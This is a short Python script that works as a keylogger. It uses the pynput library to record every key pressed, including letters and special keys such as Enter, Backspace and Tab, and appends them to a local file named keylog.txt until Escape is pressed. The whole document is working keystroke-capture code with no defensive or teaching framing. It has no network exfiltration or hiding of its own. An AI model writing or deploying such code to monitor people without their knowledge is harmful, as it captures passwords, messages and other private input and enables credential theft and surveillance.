from pynput import keyboard

# Define the log file name
log_file = "keylog.txt"

# Function to write to file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(key)

# Function to handle key press events
def on_press(key):
    try:
        # Log regular characters
        write_to_file(f'{key.char}')
    except AttributeError:
        # Log special keys
        if key == keyboard.Key.space:
            write_to_file(' ')
        elif key == keyboard.Key.enter:
            write_to_file('\n')
        elif key == keyboard.Key.backspace:
            write_to_file('<BACKSPACE>')
        elif key == keyboard.Key.tab:
            write_to_file('<TAB>')
        else:
            write_to_file(f'<{key.name}>')

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
